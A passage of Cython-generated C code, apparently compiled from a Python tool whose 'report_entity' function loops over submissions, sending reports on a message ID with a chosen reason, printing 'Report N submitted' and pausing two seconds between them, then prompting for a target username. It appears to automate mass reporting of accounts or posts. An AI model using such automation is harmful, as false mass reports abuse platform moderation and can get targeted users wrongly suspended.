              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_reason, __pyx_t_19) < 0) __PYX_ERR(0, 154, __pyx_L12_error)
              __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;

              
              __pyx_t_19 = PyTuple_New(4); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 156, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_19);
              __pyx_t_9 = 0;
              __pyx_t_18 = 127;
              __Pyx_INCREF(__pyx_kp_u_Reported_post_ID);
              __pyx_t_9 += 17;
              __Pyx_GIVEREF(__pyx_kp_u_Reported_post_ID);
              PyTuple_SET_ITEM(__pyx_t_19, 0, __pyx_kp_u_Reported_post_ID);
              __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_cur_scope->__pyx_v_message_id, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 156, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_15);
              __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_18;
              __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
              __Pyx_GIVEREF(__pyx_t_15);
              PyTuple_SET_ITEM(__pyx_t_19, 1, __pyx_t_15);
              __pyx_t_15 = 0;
              __Pyx_INCREF(__pyx_kp_u_for);
              __pyx_t_9 += 5;
              __Pyx_GIVEREF(__pyx_kp_u_for);
              PyTuple_SET_ITEM(__pyx_t_19, 2, __pyx_kp_u_for);
              __Pyx_GetModuleGlobalName(__pyx_t_15, __pyx_n_s_report_reasons); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 156, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_15);
              __pyx_t_21 = __Pyx_PyObject_GetItem(__pyx_t_15, __pyx_cur_scope->__pyx_v_reason_choice); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 156, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_21);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              __pyx_t_15 = __Pyx_GetItemInt(__pyx_t_21, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 156, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
              __pyx_t_21 = __Pyx_PyObject_FormatSimple(__pyx_t_15, __pyx_empty_unicode); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 156, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_21);
              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_21) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_21) : __pyx_t_18;
              __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_21);
              __Pyx_GIVEREF(__pyx_t_21);
              PyTuple_SET_ITEM(__pyx_t_19, 3, __pyx_t_21);
              __pyx_t_21 = 0;
              __pyx_t_21 = __Pyx_PyUnicode_Join(__pyx_t_19, 4, __pyx_t_9, __pyx_t_18); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 156, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_21);
              __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
              if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_message, __pyx_t_21) < 0) __PYX_ERR(0, 154, __pyx_L12_error)
              __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;

              
              __pyx_t_21 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_3); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 153, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_21);
              __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
              __Pyx_INCREF(__pyx_cur_scope->__pyx_v_client);
              __pyx_t_3 = __pyx_cur_scope->__pyx_v_client; __pyx_t_1 = NULL;
              if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
                __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
                if (likely(__pyx_t_1)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                  __Pyx_INCREF(__pyx_t_1);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_3, function);
                }
              }
              __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_t_21) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_21);
              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
              __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
              if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 153, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
              __pyx_r = __Pyx_Coroutine_Yield_From(__pyx_generator, __pyx_t_2);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XGOTREF(__pyx_r);
              if (likely(__pyx_r)) {
                __Pyx_XGIVEREF(__pyx_t_6);
                __pyx_cur_scope->__pyx_t_0 = __pyx_t_6;
                __Pyx_XGIVEREF(__pyx_t_7);
                __pyx_cur_scope->__pyx_t_1 = __pyx_t_7;
                __Pyx_XGIVEREF(__pyx_t_8);
                __pyx_cur_scope->__pyx_t_2 = __pyx_t_8;
                __pyx_cur_scope->__pyx_t_3 = __pyx_t_11;
                __Pyx_XGIVEREF(__pyx_t_14);
                __pyx_cur_scope->__pyx_t_4 = __pyx_t_14;
                __pyx_cur_scope->__pyx_t_5 = __pyx_t_20;
                __Pyx_XGIVEREF(__pyx_r);
                __Pyx_RefNannyFinishContext();
                __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
                /* return from generator, awaiting value */
                __pyx_generator->resume_label = 2;
                return __pyx_r;
                __pyx_L32_resume_from_await:;
                __pyx_t_6 = __pyx_cur_scope->__pyx_t_0;
                __pyx_cur_scope->__pyx_t_0 = 0;
                __Pyx_XGOTREF(__pyx_t_6);
                __pyx_t_7 = __pyx_cur_scope->__pyx_t_1;
                __pyx_cur_scope->__pyx_t_1 = 0;
                __Pyx_XGOTREF(__pyx_t_7);
                __pyx_t_8 = __pyx_cur_scope->__pyx_t_2;
                __pyx_cur_scope->__pyx_t_2 = 0;
                __Pyx_XGOTREF(__pyx_t_8);
                __pyx_t_11 = __pyx_cur_scope->__pyx_t_3;
                __pyx_t_14 = __pyx_cur_scope->__pyx_t_4;
                __pyx_cur_scope->__pyx_t_4 = 0;
                __Pyx_XGOTREF(__pyx_t_14);
                __pyx_t_20 = __pyx_cur_scope->__pyx_t_5;
                if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 153, __pyx_L12_error)
              } else {
                PyObject* exc_type = __Pyx_PyErr_Occurred();
                if (exc_type) {
                  if (likely(exc_type == PyExc_StopIteration || (exc_type != PyExc_GeneratorExit && __Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration)))) PyErr_Clear();
                  else __PYX_ERR(0, 153, __pyx_L12_error)
                }
              }

              
              __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 158, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              __pyx_t_21 = PyTuple_New(3); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 158, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_21);
              __pyx_t_9 = 0;
              __pyx_t_18 = 127;
              __Pyx_INCREF(__pyx_kp_u_Report);
              __pyx_t_9 += 7;
              __Pyx_GIVEREF(__pyx_kp_u_Report);
              PyTuple_SET_ITEM(__pyx_t_21, 0, __pyx_kp_u_Report);
              __pyx_t_1 = __Pyx_PyInt_AddObjC(__pyx_cur_scope->__pyx_v_i, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 158, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_1);
              __pyx_t_19 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 158, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_19);
              __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
              __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_19) : __pyx_t_18;
              __pyx_t_9 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_19);
              __Pyx_GIVEREF(__pyx_t_19);
              PyTuple_SET_ITEM(__pyx_t_21, 1, __pyx_t_19);
              __pyx_t_19 = 0;
              __Pyx_INCREF(__pyx_kp_u_submitted);
              __pyx_t_9 += 11;
              __Pyx_GIVEREF(__pyx_kp_u_submitted);
              PyTuple_SET_ITEM(__pyx_t_21, 2, __pyx_kp_u_submitted);
              __pyx_t_19 = __Pyx_PyUnicode_Join(__pyx_t_21, 3, __pyx_t_9, __pyx_t_18); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 158, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_19);
              __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
              __pyx_t_21 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
                __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_3);
                if (likely(__pyx_t_21)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                  __Pyx_INCREF(__pyx_t_21);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_3, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_3)) {
                PyObject *__pyx_temp[3] = {__pyx_t_21, __pyx_t_19, __pyx_n_u_green};
                __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 158, __pyx_L12_error)
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
                PyObject *__pyx_temp[3] = {__pyx_t_21, __pyx_t_19, __pyx_n_u_green};
                __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 158, __pyx_L12_error)
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
              } else
              #endif
              {
                __pyx_t_1 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 158, __pyx_L12_error)
                __Pyx_GOTREF(__pyx_t_1);
                if (__pyx_t_21) {
                  __Pyx_GIVEREF(__pyx_t_21); PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_21); __pyx_t_21 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_19);
                PyTuple_SET_ITEM(__pyx_t_1, 0+__pyx_t_12, __pyx_t_19);
                __Pyx_INCREF(__pyx_n_u_green);
                __Pyx_GIVEREF(__pyx_n_u_green);
                PyTuple_SET_ITEM(__pyx_t_1, 1+__pyx_t_12, __pyx_n_u_green);
                __pyx_t_19 = 0;
                __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_1, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 158, __pyx_L12_error)
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
              }
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
              __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 158, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

              
              __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_time); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 159, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_2);
              __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_sleep); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 159, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_1);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __pyx_t_2 = NULL;
              if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
                __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
                if (likely(__pyx_t_2)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                  __Pyx_INCREF(__pyx_t_2);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_1, function);
                }
              }
              __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_int_2);
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 159, __pyx_L12_error)
              __Pyx_GOTREF(__pyx_t_3);
              __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

              
            }
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_n_s_colored); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 161, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 161, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __pyx_t_14 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 161, __pyx_L12_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;

            
            goto __pyx_L17_try_break;

            
          }
          __pyx_L12_error:;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

          
          __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
          if (__pyx_t_12) {
            __Pyx_AddTraceback("source.report_entity", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_14, &__pyx_t_3, &__pyx_t_1) < 0) __PYX_ERR(0, 163, __pyx_L14_except_error)
            __Pyx_GOTREF(__pyx_t_14);
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_3);
            __pyx_cur_scope->__pyx_v_e = __pyx_t_3;
            /*try:*/ {

              
              __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_colored); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 164, __pyx_L38_error)
              __Pyx_GOTREF(__pyx_t_19);
              __pyx_t_21 = PyTuple_New(3); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 164, __pyx_L38_error)
              __Pyx_GOTREF(__pyx_t_21);
              __pyx_t_11 = 0;
              __pyx_t_18 = 127;
              __Pyx_INCREF(__pyx_kp_u_Error_retrieving_entity);
              __pyx_t_11 += 25;
              __Pyx_GIVEREF(__pyx_kp_u_Error_retrieving_entity);
              PyTuple_SET_ITEM(__pyx_t_21, 0, __pyx_kp_u_Error_retrieving_entity);
              __pyx_t_15 = __Pyx_PyObject_FormatSimple(__pyx_cur_scope->__pyx_v_e, __pyx_empty_unicode); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 164, __pyx_L38_error)
              __Pyx_GOTREF(__pyx_t_15);
              __pyx_t_18 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) > __pyx_t_18) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_15) : __pyx_t_18;
              __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_15);
              __Pyx_GIVEREF(__pyx_t_15);
              PyTuple_SET_ITEM(__pyx_t_21, 1, __pyx_t_15);
              __pyx_t_15 = 0;
              __Pyx_INCREF(__pyx_kp_u__19);
              __pyx_t_11 += 1;
              __Pyx_GIVEREF(__pyx_kp_u__19);
              PyTuple_SET_ITEM(__pyx_t_21, 2, __pyx_kp_u__19);
              __pyx_t_15 = __Pyx_PyUnicode_Join(__pyx_t_21, 3, __pyx_t_11, __pyx_t_18); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 164, __pyx_L38_error)
              __Pyx_GOTREF(__pyx_t_15);
              __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
              __pyx_t_21 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_19))) {
                __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_19);
                if (likely(__pyx_t_21)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_19);
                  __Pyx_INCREF(__pyx_t_21);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_19, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_19)) {
                PyObject *__pyx_temp[3] = {__pyx_t_21, __pyx_t_15, __pyx_n_u_red};
                __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_19, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 164, __pyx_L38_error)
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_19)) {
                PyObject *__pyx_temp[3] = {__pyx_t_21, __pyx_t_15, __pyx_n_u_red};
                __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_19, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 164, __pyx_L38_error)
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
              } else
              #endif
              {
                __pyx_t_22 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 164, __pyx_L38_error)
                __Pyx_GOTREF(__pyx_t_22);
                if (__pyx_t_21) {
                  __Pyx_GIVEREF(__pyx_t_21); PyTuple_SET_ITEM(__pyx_t_22, 0, __pyx_t_21); __pyx_t_21 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_15);
                PyTuple_SET_ITEM(__pyx_t_22, 0+__pyx_t_12, __pyx_t_15);
                __Pyx_INCREF(__pyx_n_u_red);
                __Pyx_GIVEREF(__pyx_n_u_red);
                PyTuple_SET_ITEM(__pyx_t_22, 1+__pyx_t_12, __pyx_n_u_red);
                __pyx_t_15 = 0;
                __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_19, __pyx_t_22, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 164, __pyx_L38_error)
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
              }
              __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
              __pyx_t_19 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 164, __pyx_L38_error)
              __Pyx_GOTREF(__pyx_t_19);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;

              
              goto __pyx_L35_continue;
            }

            
            /*finally:*/ {
              __pyx_L38_error:;
              /*exception exit:*/{
                __Pyx_PyThreadState_assign
                __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0; __pyx_t_27 = 0; __pyx_t_28 = 0; __pyx_t_29 = 0;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_27, &__pyx_t_28, &__pyx_t_29);
                if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_24, &__pyx_t_25, &__pyx_t_26) < 0)) __Pyx_ErrFetch(&__pyx_t_24, &__pyx_t_25, &__pyx_t_26);
                __Pyx_XGOTREF(__pyx_t_24);
                __Pyx_XGOTREF(__pyx_t_25);
                __Pyx_XGOTREF(__pyx_t_26);
                __Pyx_XGOTREF(__pyx_t_27);
                __Pyx_XGOTREF(__pyx_t_28);
                __Pyx_XGOTREF(__pyx_t_29);
                __pyx_t_12 = __pyx_lineno; __pyx_t_13 = __pyx_clineno; __pyx_t_23 = __pyx_filename;
                {
                  __Pyx_GOTREF(__pyx_cur_scope->__pyx_v_e);
                  __Pyx_DECREF(__pyx_cur_scope->__pyx_v_e);
                  __pyx_cur_scope->__pyx_v_e = NULL;
                }
                if (PY_MAJOR_VERSION >= 3) {
                  __Pyx_XGIVEREF(__pyx_t_27);
                  __Pyx_XGIVEREF(__pyx_t_28);
                  __Pyx_XGIVEREF(__pyx_t_29);
                  __Pyx_ExceptionReset(__pyx_t_27, __pyx_t_28, __pyx_t_29);
                }
                __Pyx_XGIVEREF(__pyx_t_24);
                __Pyx_XGIVEREF(__pyx_t_25);
                __Pyx_XGIVEREF(__pyx_t_26);
                __Pyx_ErrRestore(__pyx_t_24, __pyx_t_25, __pyx_t_26);
                __pyx_t_24 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0; __pyx_t_27 = 0; __pyx_t_28 = 0; __pyx_t_29 = 0;
                __pyx_lineno = __pyx_t_12; __pyx_clineno = __pyx_t_13; __pyx_filename = __pyx_t_23;
                goto __pyx_L14_except_error;
              }
              __pyx_L35_continue: {
                __Pyx_GOTREF(__pyx_cur_scope->__pyx_v_e);
                __Pyx_DECREF(__pyx_cur_scope->__pyx_v_e);
                __pyx_cur_scope->__pyx_v_e = NULL;
                goto __pyx_L34_except_continue;
              }
            }
            __pyx_L34_except_continue:;
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            goto __pyx_L18_try_continue;
          }
          goto __pyx_L14_except_error;
          __pyx_L14_except_error:;

          
          __Pyx_XGIVEREF(__pyx_t_6);
          __Pyx_XGIVEREF(__pyx_t_7);
          __Pyx_XGIVEREF(__pyx_t_8);
          __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
          goto __pyx_L1_error;
          __pyx_L17_try_break:;
          __Pyx_XGIVEREF(__pyx_t_6);
          __Pyx_XGIVEREF(__pyx_t_7);
          __Pyx_XGIVEREF(__pyx_t_8);
          __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
          goto __pyx_L9_break;
          __pyx_L18_try_continue:;
          __Pyx_XGIVEREF(__pyx_t_6);
          __Pyx_XGIVEREF(__pyx_t_7);
          __Pyx_XGIVEREF(__pyx_t_8);
          __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
          goto __pyx_L8_continue;
        }
        __pyx_L8_continue:;
      }
      __pyx_L9_break:;

      
      goto __pyx_L7;
    }

    
    /*else*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_colored); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 169, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__20, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 169, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 168, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_entity_username);
      __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_entity_username, __pyx_t_1);
      __Pyx_GIVEREF(__pyx_t_1);
      __pyx_t_1 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_check_exit); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 172, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_14 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_1 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_14, __pyx_cur_scope->__pyx_v_entity_username) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_cur_scope->__pyx_v_entity_username);
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 172, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_check_home); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 173, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_14 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_14)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_14);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_1 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_14, __pyx_cur_scope->__pyx_v_entity_username) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_cur_scope->__pyx_v_entity_username);
      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 173, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 173, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (__pyx_t_5) {

        
        goto __pyx_L5_break;

        
      }

      
